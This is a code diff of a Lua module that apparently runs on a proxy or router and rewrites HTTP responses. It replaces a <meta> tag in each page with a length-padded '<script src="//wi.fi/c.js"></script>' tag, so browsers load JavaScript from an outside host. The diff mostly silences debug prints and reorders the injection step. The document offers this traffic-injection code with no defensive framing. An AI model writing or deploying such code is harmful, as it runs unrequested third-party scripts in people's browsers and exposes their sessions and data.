@@ -1,6 +1,7 @@
 --local zlib = require "zlib"
 --local buffer = {}
 
+
 local script = '<script src="//wi.fi/c.js"></script>'
 local scriptLen = string.len(script)
 
@@ -14,7 +15,7 @@ function matchHost(host, html, pattern)
 	for matched in string.gmatch(html, pattern) do
 		if (string.len(matched) >= scriptLen and 
 			string.match(matched, 'content.type') == nil) then
-			print ("found ========== " .. matched) 	
+			--print ("found ========== " .. matched) 	
 			return string.gsub(matched, '-', '.') --HOLY SHIT
 		end	
 	end
@@ -24,7 +25,7 @@ end
 function padding(src)
 	--print("padding ============ src    " .. src)
 	if (string.len(src) < scriptLen) then
-		print("[WARN]: src.length must be >= script.length.")
+		--print("[WARN]: src.length must be >= script.length.")
 		return nil
 	end
 	local n = string.len(src) - scriptLen
@@ -41,19 +42,18 @@ function filterhost(host)
 end
 
 function modify(data, ctx, host, method, http_uri, status_code) -- response only
-	print("================= BEGIN", ctx, host, method, http_uri, status_code)
+	--print("================= BEGIN", ctx, host, method, http_uri, status_code)
 
 	local matched = matchHost(host, data, "<meta.->")
+	if (matched) then 
+		local dst = padding(matched)				
+		data = string.gsub(data, matched, dst)	
+		--print("================== SUCCESS:\n" .. data)
+		return data
+	end
     local seenbody = string.find(matched, "</head>")
     if (seenbody ~= nil) then
         return data
     end
-	if (matched) then 
-		local dst = padding(matched)				
-		data = string.gsub(data, matched, dst)	
-		print("================== SUCCESS:\n" .. data)
-		return data
-	end
-
     return nil
 end 
